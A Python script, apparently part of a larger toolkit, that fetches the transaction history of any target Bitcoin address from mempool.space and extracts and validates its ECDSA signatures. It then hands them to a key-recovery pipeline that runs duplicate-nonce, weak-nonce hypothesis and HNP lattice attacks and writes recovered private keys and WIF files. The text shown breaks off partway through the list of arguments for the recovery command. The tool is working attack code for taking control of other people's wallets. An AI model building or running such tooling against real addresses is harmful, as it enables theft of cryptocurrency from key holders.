#!/usr/bin/env python3
"""Targeted address signature collection + local recovery attempt.

Given a Bitcoin address, fetch bounded address transactions, extract ECDSA
signatures from inputs that spend that address, and run the existing recovery
pipeline on the focused signature set. This does not attempt fantasy
"pubkey -> private key" inversion; it only tests recoverable ECDSA weaknesses
present in real signatures.

Recovered private/WIF material, if any, is written only to local artifacts in
the output directory by automate_recover.py.
"""

from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import os
import subprocess
import sys
import time
from collections import Counter
from pathlib import Path
from typing import Any

import requests

from download_signatures import BlockWalker, scriptsig_pushes


BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
BASE58_INDEX = {c: i for i, c in enumerate(BASE58_ALPHABET)}


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def hash256(data: bytes) -> bytes:
    return sha256(sha256(data))


def hash160(data: bytes) -> bytes:
    h = hashlib.new("ripemd160")
    h.update(sha256(data))
    return h.digest()


def base58check_decode(addr: str) -> bytes:
    num = 0
    for c in addr:
        if c not in BASE58_INDEX:
            raise ValueError("invalid base58 character")
        num = num * 58 + BASE58_INDEX[c]
    raw = num.to_bytes((num.bit_length() + 7) // 8, "big")
    pad = len(addr) - len(addr.lstrip("1"))
    raw = b"\x00" * pad + raw
    if len(raw) < 5:
        raise ValueError("base58 payload too short")
    payload, checksum = raw[:-4], raw[-4:]
    if hash256(payload)[:4] != checksum:
        raise ValueError("base58 checksum mismatch")
    return payload


BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
BECH32_INDEX = {c: i for i, c in enumerate(BECH32_CHARSET)}


def bech32_polymod(values: list[int]) -> int:
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1FFFFFF) << 5 ^ value
        for i, gen in enumerate([0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]):
            if (top >> i) & 1:
                chk ^= gen
    return chk


def bech32_hrp_expand(hrp: str) -> list[int]:
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]


def bech32_decode(addr: str) -> tuple[str, list[int], str]:
    if not addr or addr.lower() != addr and addr.upper() != addr:
        raise ValueError("mixed-case bech32 address")
    addr = addr.lower()
    pos = addr.rfind("1")
    if pos < 1 or pos + 7 > len(addr):
        raise ValueError("invalid bech32 separator")
    hrp = addr[:pos]
    data = [BECH32_INDEX[c] for c in addr[pos + 1:] if c in BECH32_INDEX]
    if len(data) != len(addr[pos + 1:]):
        raise ValueError("invalid bech32 character")
    spec = "bech32" if bech32_polymod(bech32_hrp_expand(hrp) + data) == 1 else ""
    # BIP350 bech32m constant for v1+ witness programs.
    if not spec and bech32_polymod(bech32_hrp_expand(hrp) + data) == 0x2bc830a3:
        spec = "bech32m"
    if not spec:
        raise ValueError("invalid bech32 checksum")
    return hrp, data[:-6], spec


def convertbits(data: list[int], frombits: int, tobits: int, pad: bool) -> list[int]:
    acc = 0
    bits = 0
    ret: list[int] = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or value >> frombits:
            raise ValueError("invalid convertbits value")
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        raise ValueError("invalid non-zero padding")
    return ret


def address_to_scriptpubkey(address: str) -> tuple[str, str]:
    addr = address.strip()
    if not addr:
        raise ValueError("empty address")
    if not addr.lower().startswith(("bc1", "tb1", "bcrt1")):
        payload = base58check_decode(addr)
        if len(payload) != 21:
            raise ValueError("unsupported base58 payload length")
        version, h160 = payload[0], payload[1:]
        if version == 0x00:
            return "p2pkh", "76a914" + h160.hex() + "88ac"
        if version == 0x05:
            return "p2sh", "a914" + h160.hex() + "87"
        raise ValueError(f"unsupported base58 address version: {version}")

    hrp, data, spec = bech32_decode(addr)
    if hrp not in {"bc", "tb", "bcrt"}:
        raise ValueError(f"unsupported bech32 hrp: {hrp}")
    if not data:
        raise ValueError("empty witness data")
    witver = data[0]
    prog = bytes(convertbits(data[1:], 5, 8, False))
    if witver == 0 and spec != "bech32":
        raise ValueError("v0 witness address must use bech32")
    if witver > 0 and spec != "bech32m":
        raise ValueError("v1+ witness address must use bech32m")
    if witver == 0 and len(prog) == 20:
        return "p2wpkh", "0014" + prog.hex()
    if witver == 0 and len(prog) == 32:
        return "p2wsh", "0020" + prog.hex()
    if witver == 1 and len(prog) == 32:
        return "p2tr", "5120" + prog.hex()
    raise ValueError("unsupported witness program")


def fetch_address_txs(
    address: str,
    *,
    max_pages: int,
    max_txs: int,
    timeout: int,
    sleep_sec: float,
    fetch_retries: int,
    rate_limit_sleep_sec: float,
    stop_on_rate_limit: bool,
    start_after_txid: str = "",
    progress_every: int = 10,
) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    session = requests.Session()
    session.headers.update({"User-Agent": "target-address-recover/1.0"})
    base = "https://mempool.space/api/address"
    txs: list[dict[str, Any]] = []
    last_txid = str(start_after_txid or "").strip()
    stats: Counter[str] = Counter()
    last_url = ""
    stopped_reason = "completed"
    for page in range(max(1, max_pages)):
        if max_txs > 0 and len(txs) >= max_txs:
            stopped_reason = "max_txs_reached"
            break
        url = f"{base}/{address}/txs" if not last_txid else f"{base}/{address}/txs/chain/{last_txid}"
        last_url = url
        resp = None
        for attempt in range(max(0, fetch_retries) + 1):
            try:
                resp = session.get(url, timeout=timeout)
            except requests.RequestException as e:
                stats["request_errors"] += 1
                if attempt >= fetch_retries:
                    stopped_reason = f"request_error:{type(e).__name__}"
                    break
                time.sleep(max(1.0, rate_limit_sleep_sec))
                continue
            if resp.status_code == 429:
                stats["http_429"] += 1
                retry_after = resp.headers.get("Retry-After")
                try:
                    wait = float(retry_after) if retry_after else float(rate_limit_sleep_sec)
                except Exception:
                    wait = float(rate_limit_sleep_sec)
                if stop_on_rate_limit or attempt >= fetch_retries:
                    stopped_reason = "rate_limited"
                    break
                time.sleep(max(1.0, wait))
                continue
            if resp.status_code >= 500:
                stats[f"http_{resp.status_code}"] += 1
                if attempt >= fetch_retries:
                    stopped_reason = f"http_{resp.status_code}"
                    break
                time.sleep(max(1.0, rate_limit_sleep_sec))
                continue
            break
        if resp is None:
            break
        if stopped_reason != "completed":
            break
        if resp.status_code == 404:
            stopped_reason = "not_found"
            break
        resp.raise_for_status()
        batch = resp.json()
        stats["pages_fetched"] += 1
        if not isinstance(batch, list) or not batch:
            stopped_reason = "empty_page"
            break
        for tx in batch:
            if isinstance(tx, dict):
                txs.append(tx)
                if max_txs > 0 and len(txs) >= max_txs:
                    break
        last_txid = str(batch[-1].get("txid") or "")
        if progress_every > 0 and stats["pages_fetched"] % progress_every == 0:
            print(
                f"[fetch] pages={int(stats['pages_fetched'])} txs={len(txs)} "
                f"last_txid={last_txid} stopped_reason={stopped_reason}",
                flush=True,
            )
        if not last_txid or len(batch) < 25:
            stopped_reason = "last_page"
            break
        if sleep_sec > 0:
            time.sleep(sleep_sec)
    if stopped_reason == "completed" and max_pages > 0 and stats["pages_fetched"] >= max_pages:
        stopped_reason = "max_pages_reached"
    return txs, {
        "pages_fetched": int(stats["pages_fetched"]),
        "http_429": int(stats["http_429"]),
        "request_errors": int(stats["request_errors"]),
        "stopped_reason": stopped_reason,
        "last_txid": last_txid,
        "last_url": last_url,
        "start_after_txid": str(start_after_txid or "").strip(),
    }


def tx_block_context(raw: dict[str, Any]) -> tuple[int | None, int | None]:
    status = raw.get("status") if isinstance(raw, dict) else None
    if not isinstance(status, dict):
        return None, None
    height = None
    block_time = None
    try:
        if status.get("block_height") is not None:
            height = int(status["block_height"])
    except Exception:
        height = None
    try:
        if status.get("block_time") is not None:
            block_time = int(status["block_time"])
    except Exception:
        block_time = None
    return height, block_time


def input_spends_address_reason(tx: dict[str, Any], vin_index: int, address: str, scriptpubkey: str) -> tuple[bool, str]:
    try:
        inp = tx.get("vin", [])[vin_index]
    except Exception:
        return False, "missing_input"
    prev_addr = str(inp.get("prevout_address") or inp.get("address") or "").strip()
    prev_spk = str(inp.get("prevout_spk") or inp.get("prev_spk") or "").strip().lower()
    if prev_addr and prev_addr.lower() == address.lower():
        return True, "prevout_address"
    if scriptpubkey and prev_spk == scriptpubkey.lower():
        return True, "prevout_scriptpubkey"
    # P2SH address pages can omit prevout context. The spending scriptSig still
    # reveals the redeemScript or nested witness program; hash160(redeemScript)
    # must equal the P2SH script hash.
    if scriptpubkey.startswith("a914") and scriptpubkey.endswith("87") and len(scriptpubkey) == 46:
        try:
            target_h160 = bytes.fromhex(scriptpubkey[4:-2])
            pushes = scriptsig_pushes(str(inp.get("scriptsig") or ""))
            if pushes and hash160(pushes[-1]) == target_h160:
                return True, "p2sh_redeemscript_hash"
        except Exception:
            pass
    return False, "no_match"


def input_spends_address(tx: dict[str, Any], vin_index: int, address: str, scriptpubkey: str) -> bool:
    return input_spends_address_reason(tx, vin_index, address, scriptpubkey)[0]


def signature_row_from_entry(
    processor: BlockWalker,
    tx: dict[str, Any],
    vin_index: int,
    entry: dict[str, Any],
    *,
    address: str,
    block_height: int | None,
    block_time: int | None,
) -> dict[str, Any]:
    row = {
        "txid": tx.get("txid", ""),
        "vin": vin_index,
        "type": entry.get("type"),
        "signature_hex": entry.get("sig"),
        "pubkey_hex": (entry.get("pub") or "").lower(),
        "r": f"{int(entry['r']):064x}",
        "s": f"{int(entry['s']):064x}",
        "sighash": entry.get("sighash"),
        "z": f"{int(entry['z']):064x}",
        "prev_value": entry.get("prev_value"),
        "prev_spk": entry.get("prev_spk"),
        "prev_txid": entry.get("prev_txid"),
        "prev_vout": entry.get("prev_vout"),
        "block_height": block_height,
        "block_time": block_time,
        "target_address": address,
    }
    for field in ("witness_script", "redeem_script", "script_code", "pub_candidates"):
        if entry.get(field):
            row[field] = entry[field]
    row["sighash_context"] = processor.build_sighash_context(tx, vin_index, entry)
    row["sighash_context_source"] = "address_target_extraction"
    return row


def validate_signature_row(row: dict[str, Any]) -> tuple[bool, str, str]:
    """Use the same local verification logic as automate_recover reports."""
    try:
        from automate_recover import _recompute_z_from_context, _verify_row_signature  # type: ignore
        ok, verify_reason = _verify_row_signature(row)
        z_ok, z_reason = _recompute_z_from_context(row)
        if ok is True and z_ok is not False:
            return True, str(verify_reason), str(z_reason)
        return False, str(verify_reason), str(z_reason)
    except Exception as e:
        return False, f"validation_exception:{type(e).__name__}", "not_checked"


def candidate_rows_from_entry(
    processor: BlockWalker,
    tx: dict[str, Any],
    vin_index: int,
    entry: dict[str, Any],
    *,
    address: str,
    block_height: int | None,
    block_time: int | None,
) -> tuple[list[tuple[dict[str, Any], str, str]], list[tuple[dict[str, Any], str, str]]]:
    """Return verified rows, plus invalid candidate rows for diagnostics.

    P2SH/P2WSH multisig extraction may produce one signature with multiple
    pub_candidates. We map it by trying each candidate pubkey against the
    computed z and keeping only candidates that verify.
    """

    base_row = signature_row_from_entry(
        processor,
        tx,
        vin_index,
        entry,
        address=address,
        block_height=block_height,
        block_time=block_time,
    )
    candidates = []
    explicit_pub = str(base_row.get("pubkey_hex") or "").strip().lower()
    if explicit_pub:
        candidates.append(explicit_pub)
    for pub in entry.get("pub_candidates") or []:
        pub_hex = str(pub or "").strip().lower()
        if pub_hex and pub_hex not in candidates:
            candidates.append(pub_hex)

    if not candidates:
        valid, verify_reason, z_reason = validate_signature_row(base_row)
        return ([(base_row, verify_reason, z_reason)] if valid else []), (
            [] if valid else [(base_row, verify_reason, z_reason)]
        )

    valid_rows: list[tuple[dict[str, Any], str, str]] = []
    invalid_rows: list[tuple[dict[str, Any], str, str]] = []
    for pub_hex in candidates:
        row = dict(base_row)
        row["pubkey_hex"] = pub_hex
        row["pubkey_match_source"] = "explicit_pubkey" if pub_hex == explicit_pub else "script_pub_candidate"
        valid, verify_reason, z_reason = validate_signature_row(row)
        if valid:
            valid_rows.append((row, verify_reason, z_reason))
        else:
            invalid_rows.append((row, verify_reason, z_reason))
    if valid_rows:
        return valid_rows, []
    return [], invalid_rows[: min(5, len(invalid_rows))]


def strip_persisted_sighash_context(row: dict[str, Any]) -> None:
    """Keep computed z/diagnostics but avoid duplicating full tx context per row."""

    row.pop("sighash_context", None)
    row["sighash_context_source"] = "address_target_extraction_not_persisted"


def collect_address_signatures(
    *,
    address: str,
    out_path: Path,
    invalid_out_path: Path,
    report_path: Path,
    max_pages: int,
    max_txs: int,
    timeout: int,
    sleep_sec: float,
    fetch_retries: int,
    rate_limit_sleep_sec: float,
    stop_on_rate_limit: bool,
    start_after_txid: str,
    fetch_progress_every: int,
    keep_invalid_signatures: bool,
    persist_sighash_context: bool,
    dry_run: bool,
) -> dict[str, Any]:
    address_type, scriptpubkey = address_to_scriptpubkey(address)
    processor = BlockWalker(deterministic=True, include_sighash_context=True, hydrate_seen_lines=False)
    txs, fetch_report = fetch_address_txs(
        address,
        max_pages=max_pages,
        max_txs=max_txs,
        timeout=timeout,
        sleep_sec=sleep_sec,
        fetch_retries=fetch_retries,
        rate_limit_sleep_sec=rate_limit_sleep_sec,
        stop_on_rate_limit=stop_on_rate_limit,
        start_after_txid=start_after_txid,
        progress_every=fetch_progress_every,
    )
    seen_rows: set[tuple[str, int, str, str]] = set()
    counts: Counter[str] = Counter()
    pubkey_prefixes: Counter[str] = Counter()
    rows: list[dict[str, Any]] = []
    invalid_rows: list[dict[str, Any]] = []
    invalid_reason_counts: Counter[str] = Counter()
    invalid_samples: list[dict[str, Any]] = []
    match_reason_counts: Counter[str] = Counter()
    for raw in txs:
        tx = processor.normalize_tx(raw)
        height, block_time = tx_block_context(raw)
        for vin_index in range(len(tx.get("vin", []))):
            spends_target, match_reason = input_spends_address_reason(tx, vin_index, address, scriptpubkey)
            if not spends_target:
                counts["inputs_not_spending_target"] += 1
                continue
            match_reason_counts[match_reason] += 1
            counts["matched_spending_inputs"] += 1
            for entry in processor.extract_sigs_from_input(tx, vin_index):
                counts["candidate_signature_rows"] += 1
                valid_candidates, invalid_candidates = candidate_rows_from_entry(
                    processor,
                    tx,
                    vin_index,
                    entry,
                    address=address,
                    block_height=height,
                    block_time=block_time,
                )
                if invalid_candidates:
                    counts["candidate_pubkey_validation_failures"] += len(invalid_candidates)
                for row, verify_reason, z_reason in invalid_candidates:
                    counts["invalid_signature_rows"] += 1
                    invalid_reason_counts[f"verify={verify_reason}|z={z_reason}"] += 1
                    row["target_address_verify_reason"] = verify_reason
                    row["target_address_z_recompute"] = z_reason
                    if not persist_sighash_context:
                        strip_persisted_sighash_context(row)
                    invalid_rows.append(row)
                    if len(invalid_samples) < 25:
                        invalid_samples.append({
                            "txid_prefix": str(row.get("txid") or "")[:16],
                            "vin": row.get("vin"),
                            "pubkey_prefix": str(row.get("pubkey_hex") or "")[:20],
                            "verify_reason": verify_reason,
                            "z_recompute": z_reason,
                            "type": row.get("type"),
                            "sighash": row.get("sighash"),
                        })
                    if keep_invalid_signatures:
                        key = (
                            str(row["txid"]),
                            int(row["vin"]),
                            str(row["r"]),
                            str(row["s"]),
                            str(row.get("pubkey_hex") or ""),
                        )
                        if key not in seen_rows:
                            seen_rows.add(key)
                            rows.append(row)
                            counts["signature_rows"] += 1
                for row, verify_reason, z_reason in valid_candidates:
                    key = (
                        str(row["txid"]),
                        int(row["vin"]),
                        str(row["r"]),
                        str(row["s"]),
                        str(row.get("pubkey_hex") or ""),
                    )
                    if key in seen_rows:
                        counts["duplicate_rows_skipped"] += 1
                        continue
                    seen_rows.add(key)
                    row["target_address_verify_reason"] = verify_reason
                    row["target_address_z_recompute"] = z_reason
                    if not persist_sighash_context:
                        strip_persisted_sighash_context(row)
                    rows.append(row)
                    counts["signature_rows"] += 1
                    if row.get("pubkey_hex"):
                        pubkey_prefixes[str(row["pubkey_hex"])[:20]] += 1
    if not dry_run:
        out_path.parent.mkdir(parents=True, exist_ok=True)
        with out_path.open("w", encoding="utf-8") as f:
            for row in rows:
                f.write(json.dumps(row, sort_keys=True) + "\n")
        with invalid_out_path.open("w", encoding="utf-8") as f:
            for row in invalid_rows:
                f.write(json.dumps(row, sort_keys=True) + "\n")
    report: dict[str, Any] = {
        "address": address,
        "address_type": address_type,
        "scriptpubkey": scriptpubkey,
        "txs_fetched": len(txs),
        "fetch": fetch_report,
        "max_pages": max_pages,
        "max_txs": max_txs,
        "dry_run": bool(dry_run),
        "signatures_out": str(out_path),
        "invalid_signatures_out": str(invalid_out_path),
        "counts": dict(counts),
        "signature_rows": len(rows),
        "invalid_signature_rows": len(invalid_rows),
        "invalid_reason_counts": dict(invalid_reason_counts),
        "invalid_samples": invalid_samples,
        "match_reason_counts": dict(match_reason_counts),
        "keep_invalid_signatures": bool(keep_invalid_signatures),
        "persist_sighash_context": bool(persist_sighash_context),
        "pubkey_prefix_counts": dict(pubkey_prefixes.most_common(20)),
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
    return report


def run_cmd(cmd: list[str], *, dry_run: bool) -> int:
    print("$", " ".join(cmd))
    if dry_run:
        return 0
    return subprocess.run(cmd).returncode


def signature_dedup_key(row: dict[str, Any]) -> str:
    parts = (
        str(row.get("txid") or ""),
        str(row.get("vin") or ""),
        str(row.get("r") or ""),
        str(row.get("s") or ""),
        str(row.get("pubkey_hex") or ""),
    )
    return hashlib.sha256("\x1f".join(parts).encode("utf-8", "replace")).hexdigest()


def merge_signatures_unique(src: Path, dst: Path, report_path: Path, *, dry_run: bool) -> dict[str, Any]:
    """Append target-extracted public signature rows into a corpus with exact dedup."""

    seen: set[str] = set()
    dst_rows = 0
    src_rows = 0
    added = 0
    skipped_dups = 0
    bad_src_rows = 0
    bad_dst_rows = 0

    if dst.exists():
        with dst.open("r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if not line.strip():
                    continue
                try:
                    row = json.loads(line)
                    seen.add(signature_dedup_key(row))
                    dst_rows += 1
                except Exception:
                    bad_dst_rows += 1

    rows_to_add: list[str] = []
    with src.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if not line.strip():
                continue
            src_rows += 1
            try:
                row = json.loads(line)
            except Exception:
                bad_src_rows += 1
                continue
            key = signature_dedup_key(row)
            if key in seen:
                skipped_dups += 1
                continue
            seen.add(key)
            added += 1
            rows_to_add.append(json.dumps(row, sort_keys=True))

    if not dry_run and rows_to_add:
        dst.parent.mkdir(parents=True, exist_ok=True)
        with dst.open("a", encoding="utf-8") as out:
            for raw in rows_to_add:
                out.write(raw + "\n")

    report = {
        "src": str(src),
        "dst": str(dst),
        "dry_run": bool(dry_run),
        "dst_existing_rows": dst_rows,
        "src_rows": src_rows,
        "added_rows": added,
        "skipped_duplicate_rows": skipped_dups,
        "bad_src_rows": bad_src_rows,
        "bad_dst_rows": bad_dst_rows,
        "dedup_key": "sha256(txid,vin,r,s,pubkey_hex)",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Collect ECDSA signatures for one Bitcoin address and run focused local recovery")
    ap.add_argument("--address", required=True, help="Target Bitcoin address")
    ap.add_argument("--out-dir", default="", help="Output directory; default runs/address_<prefix>_<timestamp>")
    ap.add_argument("--python", default=sys.executable)
    ap.add_argument("--recover-bin", default="./ecdsa_recover_strict")
    ap.add_argument("--preload-priv-candidates", default="",
                    help="Local file containing known private key candidates; forwarded to automate_recover.py without printing secrets")
    ap.add_argument("--preload-recovered-json", default="",
                    help="Local recovered_keys.jsonl seed file; forwarded to automate_recover.py")
    ap.add_argument("--max-pages", type=int, default=4)
    ap.add_argument("--max-txs", type=int, default=100)
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--sleep-sec", type=float, default=0.25)
    ap.add_argument("--fetch-retries", type=int, default=3,
                    help="Retries per address page for transient provider errors and HTTP 429")
    ap.add_argument("--rate-limit-sleep-sec", type=float, default=30.0,
                    help="Sleep seconds after HTTP 429/5xx before retrying")
    ap.add_argument("--stop-on-rate-limit", action="store_true",
                    help="Stop collection gracefully on first HTTP 429 instead of waiting/retrying")
    ap.add_argument("--start-after-txid", default="",
                    help="Resume address pagination after this txid (mempool.space /txs/chain/<txid>)")
    ap.add_argument("--fetch-progress-every", type=int, default=10,
                    help="Print fetch progress every N pages; 0 disables progress prints")
    ap.add_argument("--threads", type=int, default=4)
    ap.add_argument("--risk-threshold", type=int, default=40,
                    help="Forward to automate_recover.py; default avoids expensive recovery on monitor-only evidence")
    ap.add_argument("--cluster-min-sigs", type=int, default=2)
    ap.add_argument("--cluster-risk-threshold", type=int, default=5)
    ap.add_argument("--max-clusters", type=int, default=30)
    ap.add_argument("--max-iter", type=int, default=2)
    ap.add_argument("--random-k-budget", type=int, default=0)
    ap.add_argument("--fallback-max-iter", type=int, default=0,
                    help="Forward to automate_recover.py; 0 uses --max-iter")
    ap.add_argument("--fallback-random-k-budget", type=int, default=-1,
                    help="Forward to automate_recover.py; -1 uses --random-k-budget")
    ap.add_argument("--hnp-timeout-sec", type=int, default=120)
    ap.add_argument("--hnp-min-leaks", type=int, default=4)
    ap.add_argument("--enable-nonce-hypotheses", action="store_true",
                    help="Forward to automate_recover.py to test bounded weak-nonce hypothesis models")
    ap.add_argument("--nonce-hypothesis-models", default="",
                    help="Comma-separated models; empty uses automate_recover.py defaults")
    ap.add_argument("--nonce-time-window-sec", type=int, default=0)
    ap.add_argument("--nonce-time-step-sec", type=int, default=1)
    ap.add_argument("--nonce-counter-max", type=int, default=0)
    ap.add_argument("--nonce-small-k-start", type=int, default=1)
    ap.add_argument("--nonce-small-k-end", type=int, default=0)
    ap.add_argument("--nonce-max-candidates", type=int, default=200000)
    ap.add_argument("--relation-min-sigs", type=int, default=8,
                    help="Forward to automate_recover.py signer relation subset builder")
    ap.add_argument("--relation-max-signers", type=int, default=200,
                    help="Maximum signers to include in relation scans")
    ap.add_argument("--relation-max-rows-per-signer", type=int, default=512,
                    help="Maximum selected rows per signer before pair-budget cap")
    ap.add_argument("--relation-max-pairs-per-signer", type=int, default=8192,
                    help="Pair budget per signer; effective rows are capped by this quadratic limit")
    ap.add_argument("--relation-neighbor-window", type=int, default=2,
                    help="Temporal neighbor window around suspicious/recovered/duplicate-r positions")
    ap.add_argument("--relation-all-signers", action="store_true",
                    help="Do not restrict relation scans to audit-flagged signers")
    ap.add_argument("--enable-segmented-relation", action="store_true", default=True,
                    help="Forward to automate_recover.py to emit segmented relation worksets")
    ap.add_argument("--no-enable-segmented-relation", action="store_false", dest="enable_segmented_relation",
                    help="Disable segmented relation workset generation")
    ap.add_argument("--segmented-relation-max-signers", type=int, default=50)
    ap.add_argument("--segmented-relation-max-segments", type=int, default=80)
    ap.add_argument("--segmented-relation-max-rows", type=int, default=128)
    ap.add_argument("--segmented-relation-max-pairs", type=int, default=8192)
    ap.add_argument("--segmented-relation-min-sigs", type=int, default=4)
    ap.add_argument("--segmented-relation-height-window", type=int, default=5000)
    ap.add_argument("--segmented-relation-time-window-sec", type=int, default=604800)
    ap.add_argument("--exhaustive-recover", action="store_true",
                    help="Forward to automate_recover.py to run all enabled stages even when fusion says monitor_only")
    ap.add_argument("--keep-invalid-signatures", action="store_true",
                    help="Keep locally unverifiable extracted rows in recovery input; default writes them only to signatures.address.invalid.jsonl")
    ap.add_argument("--persist-sighash-context", action="store_true",
                    help="Write full per-row sighash_context into signatures.address.jsonl. Default keeps files small after validating z/signature.")
    ap.add_argument("--merge-into", default="",
                    help="Optional global signatures JSONL to append this address run into with exact dedup, e.g. signatures.jsonl")
    ap.add_argument("--merge-report", default="",
                    help="Optional merge report path; default is <out-dir>/target_address_merge_report.json")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--no-recover", action="store_true")
    args = ap.parse_args()

    ts = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    safe_addr = "".join(c for c in args.address if c.isalnum())[:24] or "address"
    out_dir = Path(args.out_dir) if args.out_dir else Path("runs") / f"address_{safe_addr}_{ts}"
    sigs_path = out_dir / "signatures.address.jsonl"
    invalid_sigs_path = out_dir / "signatures.address.invalid.jsonl"
    collect_report_path = out_dir / "target_address_report.json"

    collect_report = collect_address_signatures(
        address=args.address,
        out_path=sigs_path,
        invalid_out_path=invalid_sigs_path,
        report_path=collect_report_path,
        max_pages=max(1, int(args.max_pages)),
        max_txs=max(0, int(args.max_txs)),
        timeout=max(1, int(args.timeout)),
        sleep_sec=max(0.0, float(args.sleep_sec)),
        fetch_retries=max(0, int(args.fetch_retries)),
        rate_limit_sleep_sec=max(1.0, float(args.rate_limit_sleep_sec)),
        stop_on_rate_limit=bool(args.stop_on_rate_limit),
        start_after_txid=str(args.start_after_txid or "").strip(),
        fetch_progress_every=max(0, int(args.fetch_progress_every)),
        keep_invalid_signatures=bool(args.keep_invalid_signatures),
        persist_sighash_context=bool(args.persist_sighash_context),
        dry_run=bool(args.dry_run),
    )
    print(
        "target address collection complete:",
        f"address={args.address}",
        f"txs={collect_report['txs_fetched']}",
        f"signature_rows={collect_report['signature_rows']}",
        f"report={collect_report_path}",
    )

    if str(args.merge_into or "").strip() and int(collect_report.get("signature_rows", 0)) > 0:
        merge_report_path = Path(args.merge_report) if str(args.merge_report or "").strip() else out_dir / "target_address_merge_report.json"
        merge_report = merge_signatures_unique(
            sigs_path,
            Path(str(args.merge_into).strip()),
            merge_report_path,
            dry_run=bool(args.dry_run),
        )
        print(
            "target address merge complete:",
            f"dst={merge_report['dst']}",
            f"added={merge_report['added_rows']}",
            f"skipped_dups={merge_report['skipped_duplicate_rows']}",
            f"report={merge_report_path}",
        )

    if args.no_recover or int(collect_report.get("signature_rows", 0)) <= 0:
        return

    cmd = [
        args.python,
        "automate_recover.py",
        "--sigs", str(sigs_path),
        "--audit-report", str(out_dir / "ecdsa_audit_report.json"),
        "--decision-out", str(out_dir / "automate_decision.json"),
        "--recover-bin", args.recover_bin,
        "--threads", str(max(1, int(args.threads))),
        "--risk-threshold", str(max(0, int(args.risk_threshold))),
        "--cluster-min-sigs", str(max(2, int(args.cluster_min_sigs))),
        "--cluster-risk-threshold", str(max(0, int(args.cluster_risk_threshold))),
        "--max-clusters", str(max(1, int(args.max_clusters))),
        "--max-iter", str(max(1, int(args.max_iter))),
        "--random-k-budget", str(max(0, int(args.random_k_budget))),
        "--fallback-max-iter", str(max(1, int(args.fallback_max_iter or args.max_iter))),
        "--fallback-random-k-budget", str(max(0, int(args.random_k_budget if args.fallback_random_k_budget < 0 else args.fallback_random_k_budget))),
        "--hnp-timeout-sec", str(max(1, int(args.hnp_timeout_sec))),
        "--hnp-min-leaks", str(max(1, int(args.hnp_min_leaks))),
        "--clustered-sigs-out", str(out_dir / "signatures.clustered.jsonl"),
        "--cluster-report", str(out_dir / "cluster_risk_report.json"),
        "--recover-json-out", str(out_dir / "recovered_keys.jsonl"),
        "--recover-txt-out", str(out_dir / "recovered_keys.txt"),
        "--recover-k-out", str(out_dir / "recovered_k.jsonl"),
        "--recover-deltas-out", str(out_dir / "delta_insights.jsonl"),
        "--recover-collisions-out", str(out_dir / "r_collisions.jsonl"),
        "--recover-clusters-out", str(out_dir / "dupR_clusters.jsonl"),
        "--hnp-candidates-out", str(out_dir / "hnp_lll_bkz_candidates.txt"),
        "--hnp-leaks-out", str(out_dir / "signatures.hnp_leaks.jsonl"),
        "--hnp-leak-report", str(out_dir / "hnp_leak_report.json"),
        "--hnp-bounded-k-out", str(out_dir / "hnp_bounded_k_candidates.jsonl"),
        "--hnp-bounded-k-report", str(out_dir / "hnp_bounded_k_report.json"),
        "--hnp-report-out", str(out_dir / "hnp_lll_bkz_report.json"),
        "--candidate-validation-report", str(out_dir / "candidate_validation_report.json"),
        "--target-sigs-out", str(out_dir / "signatures.target.jsonl"),
        "--stage0-subset-out", str(out_dir / "signatures.dup_r_focus.jsonl"),
        "--stage0-recoverable-out", str(out_dir / "signatures.dup_r_recoverable.jsonl"),
        "--stage0-replay-out", str(out_dir / "signatures.dup_r_replay.jsonl"),
        "--stage0-classification-report", str(out_dir / "duplicate_r_classification_report.json"),
        "--strong-signal-out", str(out_dir / "signatures.strong_signal.jsonl"),
        "--duplicate-r-pair-report", str(out_dir / "duplicate_r_pair_diagnostics.json"),
        "--verification-failure-report", str(out_dir / "verification_failure_report.json"),
        "--recovery-evidence-report", str(out_dir / "recovery_evidence_report.json"),
        "--nonce-hypothesis-out", str(out_dir / "nonce_hypothesis_k.jsonl"),
        "--nonce-hypothesis-report", str(out_dir / "nonce_hypothesis_report.json"),
        "--preload-chain-report", str(out_dir / "preload_chain_report.json"),
        "--known-k-chain-report", str(out_dir / "known_k_chain_report.json"),
        "--known-priv-chain-report", str(out_dir / "known_priv_chain_report.json"),
        "--relation-neighborhood-out", str(out_dir / "signatures.relation_neighborhood.jsonl"),
        "--relation-neighborhood-report", str(out_dir / "relation_neighborhood_report.json"),
        "--relation-min-sigs", str(max(2, int(args.relation_min_sigs))),
        "--relation-max-signers", str(max(1, int(args.relation_max_signers))),
        "--relation-max-rows-per-signer", str(max(2, int(args.relation_max_rows_per_signer))),
        "--relation-max-pairs-per-signer", str(max(1, int(args.relation_max_pairs_per_signer))),
        "--relation-neighbor-window", str(max(1, int(args.relation_neighbor_window))),
        "--segmented-relation-dir", str(out_dir / "relation_segments"),
        "--segmented-relation-report", str(out_dir / "segmented_relation_report.json"),
